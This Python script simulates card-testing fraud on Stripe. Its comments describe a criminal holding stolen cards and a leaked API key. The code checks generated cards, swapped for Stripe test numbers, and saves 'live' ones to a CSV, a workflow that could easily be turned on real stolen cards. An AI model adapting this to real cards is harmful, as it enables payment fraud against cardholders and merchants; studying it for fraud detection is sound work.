# Purpose of this script is to simulate card testing
# Scenario - I've purchased some stolen credit card creds from the dark web and a leaked Stripe API key, and want to test if the cards will get declined or not
# Generate the card numbers
# Replace the card numbers with Stripe test cards
# Plug the card creds into the payment methods API
# Generate the customer objects
# Attach the payment method objects to the customer objects
# Store the successful card numbers for future use, and discard the rest

from base64 import encode
import stripe
import random
import csv

with open("keys.txt") as f:
    PASSWORD = ''.join(f.readlines())
    stripe.api_key = str(PASSWORD).split()[0]

# Generate the card numbers/CVC


def random_with_N_digits(n):
    """Accepts an integer n and returns a random number where length = integer"""
    range_start = 10**(n-1)
    range_end = (10**n)-1
    return random.randint(range_start, range_end)

# Generate expiry


def random_expiry(n):
    """Accepts an integer n and returns an expiry date where month is between 1 and 12 and year is between next year and next year + n"""
    month_list = list(range(1, 13))
    month = random.choice(month_list)
    next_year = 2024
    year_list = list(range(next_year, next_year + n + 1))
    year = random.choice(year_list)
    return month, year


N = 10
creds = []
successful_card = "4242424242424242"
declined_card = "4000000000000002"

for i in range(N):
    rand_card_num = random_with_N_digits(16)

    # replace card number with stripe test card
    if rand_card_num % 10 == 0:
        rand_card_num_test = successful_card
    else:
        rand_card_num_test = declined_card

    rand_exp = random_expiry(10)
    rand_cvc = random_with_N_digits(3)
    creds.append([str(rand_card_num), rand_card_num_test,
                 rand_exp[0], rand_exp[1], rand_cvc])

# Plug the card creds into the payment methods API
payment_methods = []
for i in range(N):
    pm_object = stripe.PaymentMethod.create(
        type="card",
        card={
            "number": creds[i][1],
            "exp_month": creds[i][2],
            "exp_year": creds[i][3],
            "cvc": creds[i][4],
        },
    )

    payment_methods.append(pm_object.id)


# Generate the customer objects
customers = []
for i in range(N):
    cus_name = f"Customer #{i+1}"
    cus_email = f"{random_with_N_digits(12)}@gmail.com"
    cus_object = stripe.Customer.create(name=cus_name, email=cus_email)
    customers.append(cus_object.id)


# Attach the payment method objects to the customer objects
successful_payment_methods = []
for i in range(N):
    try:
        stripe.PaymentMethod.attach(
            payment_methods[i],
            customer=customers[i],
        )

    except stripe.error.CardError:
        print(
            f"Failure! Card Number: {creds[i][0]} Card Expiry: {creds[i][2]}/{str(creds[i][3])[2:]} Card CVC: {creds[i][4]}")

    else:
        print(
            f"Success! Card Number: {creds[i][0]} Card Expiry: {creds[i][2]}/{str(creds[i][3])[2:]} Card CVC: {creds[i][4]}")
        successful_payment_methods.append(creds[i])


# Store the successful card numbers for future use, and discard the rest
header = ["card_number", "card_exp_month", "card_exp_year", "card_cvc"]
with open("live_cards.csv", "w", encoding="UTF8", newline="") as f:
    writer = csv.writer(f)
    writer.writerow(header)
    for i in range(len(successful_payment_methods)):
        successful_payment_methods[i].pop(1)
        writer.writerow(successful_payment_methods[i])
